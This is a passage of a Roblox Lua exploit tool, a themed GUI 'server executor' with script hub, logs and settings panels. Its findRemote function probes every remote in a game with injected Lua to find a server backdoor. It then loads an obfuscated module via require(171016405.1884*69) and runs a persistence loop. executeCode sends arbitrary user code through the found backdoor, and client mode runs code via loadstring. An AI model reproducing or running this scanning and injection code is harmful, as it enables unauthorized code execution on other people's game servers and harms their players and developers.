	tweenService:Create(Converted["_CBg"], TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position=indPos}):Play()

	if currentTheme=="purple" then
		Converted["_SBg"].BackgroundColor3 = Color3.fromRGB(35,12,50)
		toggleStroke.Color = Color3.fromRGB(90,40,140)
		separator.BackgroundColor3 = Color3.fromRGB(150,80,220)
	else
		Converted["_SBg"].BackgroundColor3 = Color3.fromRGB(16,16,16)
		toggleStroke.Color = Color3.fromRGB(60,60,60)
		separator.BackgroundColor3 = Color3.fromRGB(120,120,120)
	end

	if execMode=="S" then
		Converted["_SBtn"].TextColor3 = Color3.fromRGB(0,0,0)
		Converted["_CBtn"].TextColor3 = Color3.fromRGB(255,255,255)
	else
		Converted["_SBtn"].TextColor3 = Color3.fromRGB(255,255,255)
		Converted["_CBtn"].TextColor3 = Color3.fromRGB(0,0,0)
	end
end

local function setMode(mode)
	if execMode==mode then return end
	savedText[execMode]=Converted["_CodeInput"].Text
	execMode=mode
	Converted["_CodeInput"].Text=savedText[mode] or ""
	updateModeButtons()
	updateCategoryTabs()
	if mode=="C"then
		Converted["_StatusDot"].Visible=false
		Converted["_StatusGlow"].Visible=false
		Converted["_R6Btn"].Visible=false
		Converted["_ReBtn"].Visible=false
		Converted["_ScanBtn"].Visible=false
		Converted["_CopyBtn"].Position=UDim2.new(1,-42,0,0)
		notify("Client mode")
	else
		Converted["_StatusDot"].Visible=true
		Converted["_StatusGlow"].Visible=true
		Converted["_R6Btn"].Visible=true
		Converted["_ReBtn"].Visible=true
		Converted["_ScanBtn"].Visible=true
		Converted["_CopyBtn"].Position=UDim2.new(1,-102,0,0)
		notify("Server mode")
	end
end

local function findRemote()
	local timee=os.clock()
	local remotes={}
	local code=""
	local pbd=game:GetService("ReplicatedStorage"):FindFirstChild("lh"..((game.PlaceId/6666)*1337*game.PlaceId))
	if pbd and pbd:IsA("RemoteFunction")then
		while true do code=generateName(math.random(12,30));if not remotes[code]then break end end
		spawn(function() pbd:InvokeServer("epic backdoor","a=Instance.new('Model',workspace)a.Name='"..code.."'")end)
		remotes[code]=pbd
	end
	logMessage("info","Scanning remotes...")
	local sent=0
	for i,remote in game:GetDescendants()do
		if not remote:IsA("RemoteEvent")and not remote:IsA("RemoteFunction")then continue end
		if string.split(remote:GetFullName(),".")[1]=="RobloxReplicatedStorage"then continue end
		if remote:FindFirstChild("__FUNCTION")or remote.Name=="__FUNCTION"then continue end
		if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name=="HDAdminClient"and remote.Parent.Name=="Signals"then continue end
		if remote.Parent and remote.Parent.Name=="DefaultChatSystemChatEvents"then continue end
		while true do code=generateName(math.random(12,30));if not remotes[code]then break end end
		sent=sent+1
		runRemote(remote,"a=Instance.new('Model',workspace)a.Name='"..code.."'")
		remotes[code]=remote
	end
	if sent==0 then updateUI("noRemote");notify("No remotes found");searching=false;return false end
	logMessage("info","Probing "..sent.." remotes...")
	for i=1,100 do
		for code,remote in pairs(remotes)do
			if workspace:FindFirstChild(code)then
				notify("Backdoor found")
				logMessage("success","Target: "..remote:GetFullName().." ("..remote.ClassName..") - "..string.format("%.2f",os.clock()-timee).."s")
				backdoor=remote
				runRemote(remote,"require(171016405.1884*69)")
				runRemote(remote,"while true do a.Parent=workspace;wait(15)a:Remove();wait(30)end")
				updateUI("found",remote:GetFullName())
				searching=false
				return true
			end
		end
		task.wait(0.1)
	end
	updateUI("notFound");notify("Backdoor not found");searching=false;return false
end

function executeCode(code)
	if code==nil or code==""then notify("No code");return end

	if execMode=="C" then
		local fn=loadstring or load
		if not fn then notify("loadstring unavailable");return end
		logMessage("code",code)
		local ok,err=pcall(function() fn(code)() end)
		if not ok then notify("Error") else notify("Executed") end
		if not ok then logMessage("error",tostring(err)) end
		return
	end

	if not hasScanned or not backdoor then
		notify("Scan first")
		return
	end

	if not backdoor.Parent then
		notify("Backdoor lost, re-scan")
		backdoor=nil
		hasScanned=false
		updateUI("idle")
		return
	end

	local finalCode=string.gsub(code,"%%username%%",player.Name)
	logMessage("code",finalCode)

	if backdoor:IsA("RemoteEvent") then
		backdoor:FireServer(finalCode)
		notify("Executed")
	elseif backdoor:IsA("RemoteFunction") then
		spawn(function()
			local ok,err=pcall(function() backdoor:InvokeServer(finalCode) end)
			if not ok then logMessage("error",tostring(err)) end
		end)
		notify("Executed")
	else
		notify("Invalid backdoor")
	end
end

function updateUI(state,data)
	if state=="scanning"then
		Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(255,200,0)
		Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(255,200,0)
		Converted["_DotStroke"].Color=Color3.fromRGB(255,200,0)
		Converted["_StatusValue"].Text="scanning..."
		Converted["_StatusValue"].TextColor3=Color3.fromRGB(255,200,0)
		Converted["_StatusFrameStroke"].Color=Color3.fromRGB(255,200,0)
	elseif state=="found"then
		Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(0,200,0)
		Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(0,200,0)
		Converted["_DotStroke"].Color=Color3.fromRGB(0,200,0)
		Converted["_StatusValue"].Text="found: "..(data or "unknown")
		Converted["_StatusValue"].TextColor3=Color3.fromRGB(0,200,0)
		Converted["_StatusFrameStroke"].Color=Color3.fromRGB(0,200,0)
	elseif state=="notFound"then
		Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(200,50,50)
		Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(200,50,50)
		Converted["_DotStroke"].Color=Color3.fromRGB(200,50,50)
		Converted["_StatusValue"].Text="not found"
		Converted["_StatusValue"].TextColor3=Color3.fromRGB(200,50,50)
		Converted["_StatusFrameStroke"].Color=Color3.fromRGB(200,50,50)
	elseif state=="noRemote"then
		Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(255,200,0)
		Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(255,200,0)
		Converted["_DotStroke"].Color=Color3.fromRGB(255,200,0)
		Converted["_StatusValue"].Text="not found"
		Converted["_StatusValue"].TextColor3=Color3.fromRGB(200,50,50)
		Converted["_StatusFrameStroke"].Color=Color3.fromRGB(200,50,50)
	elseif state=="idle"then
		Converted["_StatusDot"].BackgroundColor3=Color3.fromRGB(200,50,50)
		Converted["_StatusGlow"].BackgroundColor3=Color3.fromRGB(200,50,50)
		Converted["_DotStroke"].Color=Color3.fromRGB(200,50,50)
		Converted["_StatusValue"].Text="not found"
		Converted["_StatusValue"].TextColor3=Color3.fromRGB(200,50,50)
		Converted["_StatusFrameStroke"].Color=Color3.fromRGB(200,50,50)
	end
end

local function applyTheme(themeName)
	if themeName then currentTheme=themeName end
	if currentTheme=="purple" then
		Converted["_MainFrame"].BackgroundColor3=Color3.fromRGB(18,8,28)
		Converted["_TitleBar"].BackgroundColor3=Color3.fromRGB(35,12,50)
		Converted["_TitleText"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_TitleText"].TextStrokeColor3=Color3.fromRGB(20,5,30)
		TitleGlow.TextColor3=Color3.fromRGB(200,100,255)
		Converted["_UnloadBtn"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_CodeFrame"].BackgroundColor3=Color3.fromRGB(12,5,20)
		Converted["_CodeInput"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_ScriptsLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_SettingsLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_LogsLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_DeviceLabel"].TextColor3=Color3.fromRGB(200,170,220)
		Converted["_ThemeSectionLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_WindowLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_AotLabel"].TextColor3=Color3.fromRGB(240,220,255)
		AutoScanLabel.TextColor3=Color3.fromRGB(240,220,255)
		Converted["_AboutLabel"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_VersionLabel"].TextColor3=Color3.fromRGB(200,170,220)
		Converted["_DiscordAboutBtn"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_DiscordAboutStroke"].Color=Color3.fromRGB(180,80,255)
		Converted["_CodeStroke"].Color=Color3.fromRGB(90,40,130)
		Converted["_ExecStroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_ClearStroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_R6Stroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_ReStroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_CopyStroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_ScanStroke"].Color=Color3.fromRGB(140,60,200)
		Converted["_R6Btn"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_ReBtn"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_ScanBtn"].TextColor3=Color3.fromRGB(240,220,255)
		Converted["_ActiveBar"].BackgroundColor3=Color3.fromRGB(180,80,255)
		Converted["_LogsScroll"].BackgroundColor3=Color3.fromRGB(10,3,15)
		Converted["_LogsScrollStroke"].Color=Color3.fromRGB(80,40,120)
		Converted["_Btl"].Text="Black"
		Converted["_Ptl"].Text="Dark Purple (Active)"
		Converted["_BtcStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_PtcStroke"].Color=Color3.fromRGB(255,255,255)
	else
		Converted["_MainFrame"].BackgroundColor3=Color3.fromRGB(0,0,0)
		Converted["_TitleBar"].BackgroundColor3=Color3.fromRGB(0,0,0)
		Converted["_TitleText"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_TitleText"].TextStrokeColor3=Color3.fromRGB(0,0,0)
		TitleGlow.TextColor3=Color3.fromRGB(255,200,50)
		Converted["_UnloadBtn"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_CodeFrame"].BackgroundColor3=Color3.fromRGB(0,0,0)
		Converted["_CodeInput"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_ScriptsLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_SettingsLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_LogsLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_DeviceLabel"].TextColor3=Color3.fromRGB(200,200,200)
		Converted["_ThemeSectionLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_WindowLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_AotLabel"].TextColor3=Color3.fromRGB(255,255,255)
		AutoScanLabel.TextColor3=Color3.fromRGB(255,255,255)
		Converted["_AboutLabel"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_VersionLabel"].TextColor3=Color3.fromRGB(200,200,200)
		Converted["_DiscordAboutBtn"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_DiscordAboutStroke"].Color=Color3.fromRGB(255,255,255)
		Converted["_CodeStroke"].Color=Color3.fromRGB(80,80,80)
		Converted["_ExecStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_ClearStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_R6Stroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_ReStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_CopyStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_ScanStroke"].Color=Color3.fromRGB(150,150,150)
		Converted["_R6Btn"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_ReBtn"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_ScanBtn"].TextColor3=Color3.fromRGB(255,255,255)
		Converted["_ActiveBar"].BackgroundColor3=Color3.fromRGB(255,255,255)
		Converted["_LogsScroll"].BackgroundColor3=Color3.fromRGB(8,8,8)
		Converted["_LogsScrollStroke"].Color=Color3.fromRGB(80,80,80)
		Converted["_Btl"].Text="Black (Active)"
		Converted["_Ptl"].Text="Dark Purple"
		Converted["_BtcStroke"].Color=Color3.fromRGB(255,255,255)
		Converted["_PtcStroke"].Color=Color3.fromRGB(180,80,255)
	end
	refreshHubColors()
	updateModeButtons()
end

local function extractAssetId(input)
	if input==nil or input==""then return nil end
	input=tostring(input):gsub("%s","")
	local id=input:match("rbxassetid://(%d+)")
	if id then return id end
	id=input:match("rbxthumb://[^%d]*(%d+)")
	if id then return id end
	id=input:match("roblox%.com/asset%-?[^%d]*(%d+)")
	if id then return id end
	id=input:match("^(%d+)$")
	if id then return id end
	id=input:match("(%d+)")
	return id
end

local function applyBackground(id)
	local clean=extractAssetId(id)
	if not clean then notify("Invalid Asset ID");return end
	BgImage.Image="rbxthumb://type=Asset&id="..clean.."&w=420&h=420"
	BgImage.ImageTransparency=0.25
	BgImage.Visible=true
	BgRemoveBtn.Visible=true
	Converted["_CodeFrame"].BackgroundTransparency=0.55
	Converted["_TitleBar"].BackgroundTransparency=0.35
	notify("Background applied")
end

local function removeBackground()
	BgImage.Image=""
	BgImage.Visible=false
	BgRemoveBtn.Visible=false
	BgInput.Text=""
	Converted["_CodeFrame"].BackgroundTransparency=0
	Converted["_TitleBar"].BackgroundTransparency=0
	notify("Background removed")
end

local ModalOverlay=Instance.new("Frame")
ModalOverlay.Name="ModalOverlay"
ModalOverlay.Size=UDim2.new(1,0,1,0)
ModalOverlay.Position=UDim2.new(0,0,0,0)
ModalOverlay.BackgroundColor3=Color3.fromRGB(0,0,0)
ModalOverlay.BackgroundTransparency=1
ModalOverlay.BorderSizePixel=0
ModalOverlay.Visible=false
ModalOverlay.ZIndex=999
ModalOverlay.Active=true
ModalOverlay.Parent=Converted["_ScreenGui"]

local modalW=isMobile and 306 or 380
local modalH=isMobile and 158 or 145

local ModalBox=Instance.new("Frame")
ModalBox.Name="ModalBox"
ModalBox.Size=UDim2.new(0,modalW,0,modalH)
ModalBox.Position=UDim2.new(0.5,-modalW/2,0.5,-modalH/2)
ModalBox.BackgroundColor3=Color3.fromRGB(15,15,20)
ModalBox.BorderSizePixel=0
ModalBox.ZIndex=1000
ModalBox.Parent=ModalOverlay
local ModalCorner=Instance.new("UICorner");ModalCorner.CornerRadius=UDim.new(0,12);ModalCorner.Parent=ModalBox
local ModalStroke=Instance.new("UIStroke");ModalStroke.Color=Color3.fromRGB(90,90,120);ModalStroke.Thickness=1.5;ModalStroke.Parent=ModalBox

local ScriptNameLabel=Instance.new("TextLabel")
ScriptNameLabel.Size=UDim2.new(1,-24,0,32)
ScriptNameLabel.Position=UDim2.new(0,12,0,14)
ScriptNameLabel.BackgroundTransparency=1
ScriptNameLabel.Text=""
ScriptNameLabel.TextColor3=Color3.fromRGB(255,255,255)
ScriptNameLabel.TextSize=18
ScriptNameLabel.Font=Enum.Font.GothamBold
ScriptNameLabel.TextXAlignment=Enum.TextXAlignment.Left
ScriptNameLabel.ZIndex=1001
ScriptNameLabel.Parent=ModalBox

local ScriptSubLabel=Instance.new("TextLabel")
ScriptSubLabel.Size=UDim2.new(1,-24,0,18)
ScriptSubLabel.Position=UDim2.new(0,12,0,48)
ScriptSubLabel.BackgroundTransparency=1
ScriptSubLabel.Text="Choose an action for this script"
ScriptSubLabel.TextColor3=Color3.fromRGB(150,150,170)
ScriptSubLabel.TextSize=12
ScriptSubLabel.Font=Enum.Font.Gotham
ScriptSubLabel.TextXAlignment=Enum.TextXAlignment.Left
ScriptSubLabel.ZIndex=1001
ScriptSubLabel.Parent=ModalBox

local ButtonHolder=Instance.new("Frame")
ButtonHolder.Size=UDim2.new(1,-24,0,42)
ButtonHolder.Position=UDim2.new(0,12,1,-54)
ButtonHolder.BackgroundTransparency=1
ButtonHolder.ZIndex=1001
ButtonHolder.Parent=ModalBox

local OpenEditorBtn=Instance.new("TextButton")
OpenEditorBtn.Size=UDim2.new(0.5,-6,1,0)
OpenEditorBtn.Position=UDim2.new(0,0,0,0)
OpenEditorBtn.BackgroundColor3=Color3.fromRGB(15,15,20)
OpenEditorBtn.BackgroundTransparency=1
OpenEditorBtn.Text="Open Editor"
OpenEditorBtn.TextColor3=Color3.fromRGB(255,255,255)
OpenEditorBtn.TextSize=14
OpenEditorBtn.Font=Enum.Font.GothamBold
OpenEditorBtn.AutoButtonColor=false
OpenEditorBtn.BorderSizePixel=0
OpenEditorBtn.ZIndex=1002
OpenEditorBtn.Parent=ButtonHolder
local OEStroke=Instance.new("UIStroke");OEStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;OEStroke.Color=Color3.fromRGB(255,255,255);OEStroke.Thickness=1.5;OEStroke.Transparency=0;OEStroke.Parent=OpenEditorBtn
local OECorner=Instance.new("UICorner");OECorner.CornerRadius=UDim.new(0,8);OECorner.Parent=OpenEditorBtn

local ExecuteNowBtn=Instance.new("TextButton")
ExecuteNowBtn.Size=UDim2.new(0.5,-6,1,0)
ExecuteNowBtn.Position=UDim2.new(0.5,6,0,0)
ExecuteNowBtn.BackgroundColor3=Color3.fromRGB(255,255,255)
ExecuteNowBtn.BackgroundTransparency=0
ExecuteNowBtn.Text="Execute Now"
ExecuteNowBtn.TextColor3=Color3.fromRGB(0,0,0)
ExecuteNowBtn.TextSize=14
ExecuteNowBtn.Font=Enum.Font.GothamBold
ExecuteNowBtn.AutoButtonColor=false
ExecuteNowBtn.BorderSizePixel=0
ExecuteNowBtn.ZIndex=1002
ExecuteNowBtn.Parent=ButtonHolder
local ENCorner=Instance.new("UICorner");ENCorner.CornerRadius=UDim.new(0,8);ENCorner.Parent=ExecuteNowBtn

local currentModalCode=""
local currentModalName=""
local modalBusy=false

local function showModal(scriptName,code)
	if modalBusy then return end
	modalBusy=true
	currentModalCode=code
	currentModalName=scriptName
	ScriptNameLabel.Text=scriptName
	ScriptSubLabel.Text="Choose an action for this script"
	ModalOverlay.Visible=true
	ModalBox.Size=UDim2.new(0,modalW*0.75,0,modalH*0.75)
	ModalBox.Position=UDim2.new(0.5,-modalW*0.75/2,0.5,-modalH*0.75/2)
	ModalBox.BackgroundTransparency=1
	ModalStroke.Transparency=1
	ScriptNameLabel.TextTransparency=1
	ScriptSubLabel.TextTransparency=1
	tweenService:Create(blurEffect,TweenInfo.new(0.3),{Size=18}):Play()
	tweenService:Create(ModalBox,TweenInfo.new(0.3,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{
		Size=UDim2.new(0,modalW,0,modalH),
		Position=UDim2.new(0.5,-modalW/2,0.5,-modalH/2),
		BackgroundTransparency=0
	}):Play()
	tweenService:Create(ModalStroke,TweenInfo.new(0.3),{Transparency=0}):Play()
	tweenService:Create(ScriptNameLabel,TweenInfo.new(0.25),{TextTransparency=0}):Play()
	tweenService:Create(ScriptSubLabel,TweenInfo.new(0.3),{TextTransparency=0}):Play()
	task.wait(0.35)
	modalBusy=false
end

local function hideModal()
	if modalBusy then return end
	modalBusy=true
	tweenService:Create(blurEffect,TweenInfo.new(0.25),{Size=0}):Play()
	tweenService:Create(ModalBox,TweenInfo.new(0.22,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{
		Size=UDim2.new(0,modalW*0.8,0,modalH*0.8),
		Position=UDim2.new(0.5,-modalW*0.8/2,0.5,-modalH*0.8/2),
		BackgroundTransparency=1
	}):Play()
	tweenService:Create(ModalStroke,TweenInfo.new(0.2),{Transparency=1}):Play()
	tweenService:Create(ScriptNameLabel,TweenInfo.new(0.15),{TextTransparency=1}):Play()
	tweenService:Create(ScriptSubLabel,TweenInfo.new(0.15),{TextTransparency=1}):Play()
	task.wait(0.28)
	ModalOverlay.Visible=false
	modalBusy=false
end

ModalOverlay.InputBegan:Connect(function(input)
	if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
		local pos=input.Position
		local boxPos=ModalBox.AbsolutePosition
		local boxSize=ModalBox.AbsoluteSize
		if pos.X<boxPos.X or pos.X>boxPos.X+boxSize.X or pos.Y<boxPos.Y or pos.Y>boxPos.Y+boxSize.Y then
			hideModal()
		end
	end
end)

OpenEditorBtn.MouseEnter:Connect(function() tweenService:Create(OpenEditorBtn,TweenInfo.new(0.15),{BackgroundTransparency=0.85}):Play() end)
OpenEditorBtn.MouseLeave:Connect(function() tweenService:Create(OpenEditorBtn,TweenInfo.new(0.15),{BackgroundTransparency=1}):Play() end)
ExecuteNowBtn.MouseEnter:Connect(function() tweenService:Create(ExecuteNowBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(230,230,230)}):Play() end)
ExecuteNowBtn.MouseLeave:Connect(function() tweenService:Create(ExecuteNowBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(255,255,255)}):Play() end)

OpenEditorBtn.MouseButton1Click:Connect(function()
	Converted["_CodeInput"].Text=currentModalCode
	switchTab("executor")
	notify("Script loaded into editor")
	hideModal()
end)

ExecuteNowBtn.MouseButton1Click:Connect(function()
	local code=currentModalCode
	task.spawn(function() executeCode(code) end)
	hideModal()
end)

local function DRAG_fake_script()
	local dragging=false
	local dragStart=nil
	local startPos=nil
	local moved=false
	Converted["_TitleBar"].InputBegan:Connect(function(input)
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			dragging=true;moved=false
			dragStart=input.Position
			startPos=Converted["_MainFrame"].Position
		end
	end)
	Converted["_TitleBar"].InputEnded:Connect(function(input)
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			dragging=false
		end
	end)
	userInput.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
			local delta=input.Position-dragStart
			if math.abs(delta.X)>2 or math.abs(delta.Y)>2 then moved=true end
			if moved then
				Converted["_MainFrame"].Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
			end
		end
	end)
end

local function REOPEN_DRAG_fake_script()
	local rd=false;local rds=nil;local rsp=nil;local rmoved=false
	Converted["_ReopenBtn"].InputBegan:Connect(function(input)
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			rd=true;rmoved=false;rds=input.Position;rsp=Converted["_ReopenBtn"].Position
		end
	end)
	Converted["_ReopenBtn"].InputEnded:Connect(function(input)
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			if not rmoved then Converted["_MainFrame"].Visible=true;Converted["_ReopenBtn"].Visible=false end
			rd=false
		end
	end)
	userInput.InputChanged:Connect(function(input)
		if rd and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
			local delta=input.Position-rds
			if math.abs(delta.X)>3 or math.abs(delta.Y)>3 then rmoved=true end
			Converted["_ReopenBtn"].Position=UDim2.new(rsp.X.Scale,rsp.X.Offset+delta.X,rsp.Y.Scale,rsp.Y.Offset+delta.Y)
		end
	end)
end

local function REOPEN_SPIN_fake_script()
	local rot=0
	while Converted["_ReopenImg"].Parent do
		rot=(rot+3)%360
		Converted["_ReopenImg"].Rotation=rot
		task.wait(0.01)
	end
end

local function ICON_SPIN_fake_script()
	local rot=0
	while Converted["_Icon"].Parent do
		rot=(rot+3)%360
		Converted["_Icon"].Rotation=rot
		task.wait(0.01)
	end
end

local function CLOSE_fake_script()
	Converted["_UnloadBtn"].MouseButton1Click:Connect(function()
		Converted["_MainFrame"].Visible=false
		Converted["_ReopenBtn"].Visible=true
	end)
end

local function BTN_fake_script()
	Converted["_SBtn"].MouseButton1Click:Connect(function() setMode("S")end)
	Converted["_CBtn"].MouseButton1Click:Connect(function() setMode("C")end)
	Converted["_EditorBtn"].MouseButton1Click:Connect(function() switchTab("executor")end)
	Converted["_ScripthubBtn"].MouseButton1Click:Connect(function() switchTab("scripts")end)
	Converted["_SettingsBtn"].MouseButton1Click:Connect(function() switchTab("settings")end)
	Converted["_DiscordBtn"].MouseButton1Click:Connect(function()
		local ok=pcall(function() game:GetService("GuiService"):SetClipboard("https://discord.gg/cKxRKSsk6C")end)
		if not ok then pcall(function() setclipboard("https://discord.gg/cKxRKSsk6C")end)end
		notify("Discord link copied to clipboard")
	end)
	Converted["_DiscordAboutBtn"].MouseButton1Click:Connect(function()
		local ok=pcall(function() game:GetService("GuiService"):SetClipboard("https://discord.gg/cKxRKSsk6C")end)
		if not ok then pcall(function() setclipboard("https://discord.gg/cKxRKSsk6C")end)end
		notify("Discord link copied to clipboard")
	end)
	Converted["_BlackThemeCard"].MouseButton1Click:Connect(function() applyTheme("black");notify("Black theme applied")end)
	Converted["_PurpleThemeCard"].MouseButton1Click:Connect(function() applyTheme("purple");notify("Dark Purple theme applied")end)
	Converted["_AotToggleBg"].MouseButton1Click:Connect(function()
		aotState=not aotState
		tweenService:Create(Converted["_AotDot"],TweenInfo.new(0.15),{Position=aotState and UDim2.new(1,-25,0.5,-11)or UDim2.new(0,3,0.5,-11)}):Play()
		tweenService:Create(Converted["_AotToggleBg"],TweenInfo.new(0.15),{BackgroundColor3=aotState and Color3.fromRGB(50,205,50)or Color3.fromRGB(120,120,120)}):Play()
		if aotState then Converted["_ScreenGui"].DisplayOrder=999999;notify("Always on Top on")else Converted["_ScreenGui"].DisplayOrder=0;notify("Always on Top off")end
	end)
	AutoScanToggleBg.MouseButton1Click:Connect(function()
		autoScanState = not autoScanState
		tweenService:Create(AutoScanDot,TweenInfo.new(0.15),{Position=autoScanState and UDim2.new(1,-25,0.5,-11)or UDim2.new(0,3,0.5,-11)}):Play()
		tweenService:Create(AutoScanToggleBg,TweenInfo.new(0.15),{BackgroundColor3=autoScanState and Color3.fromRGB(50,205,50)or Color3.fromRGB(120,120,120)}):Play()
		saveAutoScan(autoScanState)
		if autoScanState then notify("Auto Scan enabled")else notify("Auto Scan disabled")end
	end)
	BgApplyBtn.MouseButton1Click:Connect(function()
		if BgInput.Text==""then notify("Enter Asset ID");return end
		applyBackground(BgInput.Text)
	end)
	BgRemoveBtn.MouseButton1Click:Connect(function() removeBackground()end)
	BgApplyBtn.MouseEnter:Connect(function() tweenService:Create(BgApplyBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(220,220,220)}):Play() end)
	BgApplyBtn.MouseLeave:Connect(function() tweenService:Create(BgApplyBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(255,255,255)}):Play() end)
	BgRemoveBtn.MouseEnter:Connect(function() tweenService:Create(BgRemoveBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(230,70,70)}):Play() end)
	BgRemoveBtn.MouseLeave:Connect(function() tweenService:Create(BgRemoveBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(200,50,50)}):Play() end)
	Converted["_LogsCopyBtn"].MouseButton1Click:Connect(function()
		local text=table.concat(logs,"\n")
		if text=="" then notify("No logs to copy");return end
		if clipboardFn then
			local ok=pcall(clipboardFn,text)
			if ok then notify("Logs copied to clipboard") else notify("Copy failed") end
		else notify("Clipboard unavailable") end
	end)
	Converted["_LogsClearBtn"].MouseButton1Click:Connect(function()
		logs={}
		logOrder=0
		local sf=Converted["_LogsScroll"]
		for _,ch in ipairs(sf:GetChildren()) do
			if ch:IsA("TextLabel") and ch.Name=="LogLine" then ch:Destroy() end
		end
		sf.CanvasSize=UDim2.new(0,0,0,0)
		Converted["_LogsCount"].Text="0 lines"
		notify("Logs cleared")
	end)
	Converted["_LogsCopyBtn"].MouseEnter:Connect(function() tweenService:Create(Converted["_LogsCopyStroke"],TweenInfo.new(0.15),{Color=Color3.fromRGB(255,200,50)}):Play() end)
	Converted["_LogsCopyBtn"].MouseLeave:Connect(function() tweenService:Create(Converted["_LogsCopyStroke"],TweenInfo.new(0.15),{Color=Color3.fromRGB(255,255,255)}):Play() end)
	Converted["_LogsClearBtn"].MouseEnter:Connect(function() tweenService:Create(Converted["_LogsClearStroke"],TweenInfo.new(0.15),{Color=Color3.fromRGB(255,80,80)}):Play() end)
	Converted["_LogsClearBtn"].MouseLeave:Connect(function() tweenService:Create(Converted["_LogsClearStroke"],TweenInfo.new(0.15),{Color=Color3.fromRGB(200,70,70)}):Play() end)
end

local function SCRIPTS_fake_script()
	for key, data in pairs(ScriptBtns) do
		local btn = data.button
		local stroke = data.stroke
		local activeTween = nil

		btn.MouseButton1Click:Connect(function()
			showModal(data.label, data.code)
		end)

		btn.MouseEnter:Connect(function()
			if activeTween then activeTween:Cancel() end
			local C = getHubColors()
			activeTween = tweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3=C.btnHover})
			activeTween:Play()
			if stroke then tweenService:Create(stroke, TweenInfo.new(0.12), {Color=C.btnStrokeHov}):Play() end
		end)

		btn.MouseLeave:Connect(function()
			if activeTween then activeTween:Cancel() end
			local C = getHubColors()
			activeTween = tweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3=C.btnBg})
			activeTween:Play()
			if stroke then tweenService:Create(stroke, TweenInfo.new(0.12), {Color=C.btnStroke}):Play() end
		end)

		btn.MouseButton1Down:Connect(function()
			if activeTween then activeTween:Cancel() end
			local C = getHubColors()
			activeTween = tweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3=C.btnPress})
			activeTween:Play()
			if stroke then tweenService:Create(stroke, TweenInfo.new(0.08), {Color=C.btnStrokePrs}):Play() end
		end)

		btn.MouseButton1Up:Connect(function()
			if activeTween then activeTween:Cancel() end
			local C = getHubColors()
			activeTween = tweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3=C.btnHover})
			activeTween:Play()
			if stroke then tweenService:Create(stroke, TweenInfo.new(0.08), {Color=C.btnStrokeHov}):Play() end
		end)
	end
end

local function SCAN_fake_script()
	Converted["_ScanBtn"].MouseButton1Click:Connect(function()
		if searching then return end
		if backdoor then notify("Already found");return end
		searching=true
		hasScanned=true
		updateUI("scanning")
